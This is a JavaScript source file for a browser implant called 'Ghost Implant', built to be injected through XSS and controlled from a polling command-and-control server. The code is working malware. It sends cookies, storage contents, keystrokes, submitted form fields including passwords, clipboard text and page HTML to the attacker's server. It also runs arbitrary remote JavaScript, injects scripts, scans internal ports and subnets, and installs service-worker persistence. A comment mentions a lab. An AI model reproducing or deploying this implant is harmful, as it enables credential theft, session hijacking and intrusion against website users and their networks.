/**
 * Ghost Implant — hook.js
 *
 * Thin browser-based agent. Injected via XSS.
 * All logic lives on the C2 server — this just polls and executes.
 *
 * Delivery: <script src="http://HOST:5000/hook.js"></script>
 */
(function () {
  // ─── Config ───────────────────────────────────────────────────
  // Auto-detect C2 URL from the script's own src attribute.
  // This makes the implant work regardless of where it's loaded from —
  // the C2 address is always the server that served hook.js.
  var C2 = (function () {
    try {
      var scripts = document.querySelectorAll('script[src*="hook.js"]');
      if (scripts.length > 0) {
        var src = scripts[scripts.length - 1].src;
        var u = new URL(src);
        return u.origin; // e.g. http://attacker:5000
      }
    } catch (e) {}
    // Fallback: assume C2 runs on same host, port 5000
    return location.protocol + "//" + location.hostname + ":5000";
  })();
  var POLL_INTERVAL = 3000;
  var agentId = null;
  var interval = POLL_INTERVAL;

  // Persistent keylogger state (survives across poll cycles)
  var keylogActive = false;
  var keylogBuffer = [];
  var keylogResolve = null;

  // ─── Helpers ──────────────────────────────────────────────────
  function post(url, data) {
    return fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    })
      .then(function (r) { return r.json(); })
      .catch(function () { return {}; });
  }

  function get(url) {
    return fetch(url)
      .then(function (r) { return r.json(); })
      .catch(function () { return { type: "noop" }; });
  }

  // ─── Fingerprint ──────────────────────────────────────────────
  function fingerprint() {
    var lsKeys = [];
    try {
      for (var i = 0; i < localStorage.length; i++) {
        lsKeys.push(localStorage.key(i));
      }
    } catch (e) {}

    return {
      user_agent: navigator.userAgent,
      url: location.href,
      cookies: document.cookie || "",
      screen: screen.width + "x" + screen.height,
      language: navigator.language,
      platform: navigator.platform || "unknown",
      referrer: document.referrer,
      local_storage_keys: lsKeys,
    };
  }

  // ─── Global keydown listener (always attached once) ───────────
  // This is the fix: we attach the listener ONCE at init, globally,
  // and buffer keystrokes whenever keylogging is active.
  function globalKeyHandler(e) {
    if (!keylogActive) return;
    var targetTag = "";
    try {
      targetTag = e.target.tagName + (e.target.id ? "#" + e.target.id : "") +
        (e.target.name ? "[name=" + e.target.name + "]" : "");
    } catch (ex) {
      targetTag = "unknown";
    }
    keylogBuffer.push({
      key: e.key,
      code: e.code,
      target: targetTag,
      ts: Date.now(),
    });
  }

  // Attach once on document with useCapture — gets priority over page handlers
  document.addEventListener("keydown", globalKeyHandler, true);

  // ─── Task handlers ────────────────────────────────────────────
  var handlers = {};

  handlers.noop = function () {
    return null;
  };

  handlers.steal_cookies = function () {
    return { cookies: document.cookie };
  };

  handlers.exfil_localstorage = function () {
    var data = {};
    try {
      for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        data[key] = localStorage.getItem(key);
      }
    } catch (e) {
      data._error = e.message;
    }
    // Also grab sessionStorage
    var sdata = {};
    try {
      for (var j = 0; j < sessionStorage.length; j++) {
        var skey = sessionStorage.key(j);
        sdata[skey] = sessionStorage.getItem(skey);
      }
    } catch (e2) {
      sdata._error = e2.message;
    }
    return { local_storage: data, session_storage: sdata };
  };

  handlers.exec_js = function (payload) {
    try {
      // Use Function() instead of eval() — works in strict mode
      var fn = new Function("return (" + payload.code + ")");
      var result = fn();
      return { output: String(result) };
    } catch (e) {
      // If expression fails, try as statements
      try {
        var fn2 = new Function(payload.code);
        var result2 = fn2();
        return { output: String(result2) };
      } catch (e2) {
        return { error: e2.message, stack: e2.stack ? e2.stack.slice(0, 500) : "" };
      }
    }
  };

  handlers["eval"] = handlers.exec_js;

  handlers.keylog = function (payload) {
    var duration = (payload && payload.duration) || 10000;

    // Clear previous buffer, activate capture
    keylogBuffer = [];
    keylogActive = true;

    return new Promise(function (resolve) {
      setTimeout(function () {
        keylogActive = false;
        var captured = keylogBuffer.slice();
        keylogBuffer = [];
        resolve({
          keystrokes: captured,
          count: captured.length,
          duration_ms: duration,
          note: captured.length === 0
            ? "No keys pressed during capture window. Make sure the page has focus and type something."
            : "Captured " + captured.length + " keystrokes",
        });
      }, duration);
    });
  };

  handlers.portscan = function (payload) {
    var target = (payload && payload.target) || "127.0.0.1";
    var ports = (payload && payload.ports) || [80, 443, 8080, 3000, 3306, 5432, 22, 21, 8888, 9090];
    var timeout = (payload && payload.timeout) || 3000;
    var results = [];

    // WebSocket-based port scanning — most reliable from browser
    // Open port: ws connection fails fast with a protocol error (< 200ms)
    // Closed port: connection hangs until timeout
    function scanPort(host, port) {
      return new Promise(function (resolve) {
        var start = Date.now();
        var done = false;

        function finish(status) {
          if (done) return;
          done = true;
          results.push({ port: port, status: status, elapsed: Date.now() - start });
          resolve();
        }

        var timer = setTimeout(function () {
          finish("closed");
        }, timeout);

        try {
          var ws = new WebSocket("ws://" + host + ":" + port);
          ws.onopen = function () {
            clearTimeout(timer);
            ws.close();
            finish("open");
          };
          ws.onerror = function () {
            clearTimeout(timer);
            var elapsed = Date.now() - start;
            // Open port with non-WS service: fails fast (< 1s)
            // Closed port: browser retries, takes longer / hits timeout
            if (elapsed < timeout * 0.7) {
              finish("open");
            } else {
              finish("closed");
            }
          };
          ws.onclose = function () {
            clearTimeout(timer);
            var elapsed = Date.now() - start;
            if (elapsed < timeout * 0.7) {
              finish("open");
            } else {
              finish("closed");
            }
          };
        } catch (e) {
          clearTimeout(timer);
          finish("error");
        }
      });
    }

    // Scan 3 at a time to avoid overwhelming the browser
    function scanBatch(portsArray, idx) {
      if (idx >= portsArray.length) {
        return Promise.resolve();
      }
      var batch = portsArray.slice(idx, idx + 3);
      return Promise.all(batch.map(function (p) { return scanPort(target, p); }))
        .then(function () { return scanBatch(portsArray, idx + 3); });
    }

    return scanBatch(ports, 0).then(function () {
      results.sort(function (a, b) { return a.port - b.port; });
      return {
        target: target,
        scan_results: results,
        open_ports: results.filter(function (r) { return r.status === "open"; }).map(function (r) { return r.port; }),
      };
    });
  };

  handlers.screenshot = function () {
    // Capture DOM metadata — forms with current values, all links, page info
    var forms = [];
    try {
      var formEls = document.querySelectorAll("form");
      for (var i = 0; i < formEls.length; i++) {
        var f = formEls[i];
        var inputs = [];
        for (var j = 0; j < f.elements.length; j++) {
          var el = f.elements[j];
          inputs.push({
            name: el.name || el.id || "",
            type: el.type || "unknown",
            value: el.type === "password" ? el.value : el.value, // Capture password values too in lab
          });
        }
        forms.push({ action: f.action, method: f.method, inputs: inputs });
      }
    } catch (e) {}

    var links = [];
    try {
      var anchors = document.querySelectorAll("a[href]");
      for (var k = 0; k < anchors.length && k < 100; k++) {
        links.push({
          href: anchors[k].href,
          text: (anchors[k].textContent || "").trim().slice(0, 80),
        });
      }
    } catch (e2) {}

    return {
      title: document.title,
      url: location.href,
      html_length: document.documentElement.outerHTML.length,
      forms: forms,
      links: links,
      meta: {
        charset: document.characterSet,
        doctype: document.doctype ? document.doctype.name : "none",
      },
    };
  };

  handlers.inject_html = function (payload) {
    if (!payload || !payload.html) return { error: "no html provided" };
    try {
      // Use DOMParser + adoptNode for more reliable injection
      var container = document.createElement("div");
      container.id = "ghost-inject-" + Date.now();
      container.innerHTML = payload.html;
      document.body.appendChild(container);

      // If it contains script tags, they won't execute via innerHTML
      // Re-create them so they actually run
      var scripts = container.querySelectorAll("script");
      for (var i = 0; i < scripts.length; i++) {
        var oldScript = scripts[i];
        var newScript = document.createElement("script");
        if (oldScript.src) {
          newScript.src = oldScript.src;
        } else {
          newScript.textContent = oldScript.textContent;
        }
        oldScript.parentNode.replaceChild(newScript, oldScript);
      }

      return { injected: true, container_id: container.id, length: payload.html.length };
    } catch (e) {
      return { error: e.message };
    }
  };

  handlers.exfil_page = function () {
    return {
      url: location.href,
      title: document.title,
      html: document.documentElement.outerHTML.slice(0, 100000), // 100KB cap
    };
  };

  handlers.network_discovery = function (payload) {
    var base = (payload && payload.base) || "172.23.0";
    var rangeStart = (payload && payload.start) || 1;
    var rangeEnd = (payload && payload.end) || 20;
    var timeout = (payload && payload.timeout) || 2000;
    var hosts = [];

    function probeHost(ip) {
      return new Promise(function (resolve) {
        var start = Date.now();
        var controller = new AbortController();
        var timer = setTimeout(function () {
          controller.abort();
          resolve(); // No response = probably not there
        }, timeout);

        fetch("http://" + ip + "/", { mode: "no-cors", signal: controller.signal })
          .then(function () {
            clearTimeout(timer);
            hosts.push({ ip: ip, elapsed: Date.now() - start, method: "fetch-ok" });
            resolve();
          })
          .catch(function (err) {
            clearTimeout(timer);
            var elapsed = Date.now() - start;
            if (err.name === "AbortError") return; // Timeout, skip
            // Any fast error means something is there (connection refused = host exists)
            if (elapsed < timeout * 0.8) {
              hosts.push({ ip: ip, elapsed: elapsed, method: "fetch-error-fast" });
            }
            resolve();
          });
      });
    }

    // Probe in batches of 5
    function probeBatch(ips, idx) {
      if (idx >= ips.length) return Promise.resolve();
      var batch = ips.slice(idx, idx + 5);
      return Promise.all(batch.map(probeHost))
        .then(function () { return probeBatch(ips, idx + 5); });
    }

    var ips = [];
    for (var i = rangeStart; i <= rangeEnd; i++) {
      ips.push(base + "." + i);
    }

    return probeBatch(ips, 0).then(function () {
      return {
        subnet: base,
        range: rangeStart + "-" + rangeEnd,
        alive_hosts: hosts,
        count: hosts.length,
      };
    });
  };

  // Redirect the victim browser to a URL (for pivoting to internal pages)
  handlers.redirect = function (payload) {
    if (!payload || !payload.url) return { error: "no url provided" };
    var url = payload.url;
    // Capture current page info before redirecting
    var before = { from_url: location.href, to_url: url, ts: Date.now() };

    // Send result first, then redirect
    return post(C2 + "/api/result", {
      agent_id: agentId,
      task_type: "redirect",
      data: before,
    }).then(function () {
      location.href = url;
      return null; // Don't send another result
    });
  };

  // Steal form data when forms are submitted
  // Uses sendBeacon to fire results BEFORE navigation kills the page
  handlers.form_grab = function (payload) {
    var duration = (payload && payload.duration) || 30000;
    var grabCount = 0;
    var taskId = (payload && payload._task_id) || "";

    function onSubmit(e) {
      var form = e.target;
      if (!form || !form.elements) return;

      var fields = {};
      for (var i = 0; i < form.elements.length; i++) {
        var el = form.elements[i];
        if (el.name) {
          fields[el.name] = el.value;
        }
      }

      var formData = {
        action: form.action,
        method: form.method,
        fields: fields,
        page_url: location.href,
        ts: Date.now(),
      };

      grabCount++;

      // Send immediately via sendBeacon — survives page navigation
      var beaconData = JSON.stringify({
        agent_id: agentId,
        task_type: "form_grab",
        task_id: taskId,
        data: { form: formData, grab_number: grabCount },
      });
      // Use text/plain to avoid CORS preflight (cross-origin beacon)
      navigator.sendBeacon(C2 + "/api/result", new Blob([beaconData], { type: "text/plain" }));
    }

    document.addEventListener("submit", onSubmit, true);

    return new Promise(function (resolve) {
      setTimeout(function () {
        document.removeEventListener("submit", onSubmit, true);
        resolve({
          forms_grabbed: grabCount,
          duration_ms: duration,
          note: grabCount === 0
            ? "No forms submitted during capture window"
            : grabCount + " form submission(s) captured and sent via beacon",
        });
      }, duration);
    });
  };

  // Steal clipboard content
  handlers.clipboard = function () {
    return navigator.clipboard.readText()
      .then(function (text) {
        return { clipboard: text };
      })
      .catch(function (e) {
        return { error: "Clipboard read denied: " + e.message, note: "Requires user gesture or permissions" };
      });
  };

  // ─── Task executor ────────────────────────────────────────────
  function executeTask(task) {
    var handler = handlers[task.type];
    if (!handler) {
      return post(C2 + "/api/result", {
        agent_id: agentId,
        task_type: task.type,
        task_id: task.task_id,
        data: { error: "unknown task type: " + task.type },
      });
    }

    try {
      // Inject task_id into payload so handlers like form_grab can use it for beacons
      var taskPayload = task.payload || {};
      taskPayload._task_id = task.task_id;
      var result = handler(taskPayload);

      // Handle both sync results and promises
      if (result && typeof result.then === "function") {
        return result.then(function (data) {
          if (data !== null && data !== undefined) {
            return post(C2 + "/api/result", {
              agent_id: agentId,
              task_type: task.type,
              task_id: task.task_id,
              data: data,
            });
          }
        }).catch(function (e) {
          return post(C2 + "/api/result", {
            agent_id: agentId,
            task_type: task.type,
            task_id: task.task_id,
            data: { error: e.message },
          });
        });
      } else {
        if (result !== null && result !== undefined) {
          return post(C2 + "/api/result", {
            agent_id: agentId,
            task_type: task.type,
            task_id: task.task_id,
            data: result,
          });
        }
        return Promise.resolve();
      }
    } catch (e) {
      return post(C2 + "/api/result", {
        agent_id: agentId,
        task_type: task.type,
        task_id: task.task_id,
        data: { error: e.message },
      });
    }
  }

  // ─── Poll loop ────────────────────────────────────────────────
  function poll() {
    if (!agentId) return;
    get(C2 + "/api/task/" + agentId)
      .then(function (task) {
        if (task && task.type && task.type !== "noop") {
          return executeTask(task);
        }
      })
      .catch(function () {})
      .then(function () {
        setTimeout(poll, interval);
      });
  }

  // ─── Service Worker persistence ───────────────────────────────
  function installPersistence() {
    if (!("serviceWorker" in navigator)) return;
    try {
      // SW must be same-origin. Only attempt if C2 is same origin as page.
      if (location.origin === new URL(C2).origin) {
        navigator.serviceWorker.register(C2 + "/sw.js", { scope: "/" })
          .then(function (reg) {
            console.log("[ghost] sw registered, scope:", reg.scope);
          })
          .catch(function () {});
      }
    } catch (e) {}
  }

  // ─── Init ─────────────────────────────────────────────────────
  function init() {
    var fp = fingerprint();
    post(C2 + "/api/register", fp).then(function (res) {
      if (res && res.agent_id) {
        agentId = res.agent_id;
        interval = res.interval || POLL_INTERVAL;
        console.log("[ghost] agent=" + agentId + " interval=" + interval + "ms");
        installPersistence();
        poll();
      }
    });
  }

  // Don't double-init if hook is injected multiple times
  if (window.__ghost_active) return;
  window.__ghost_active = true;
  init();
})();
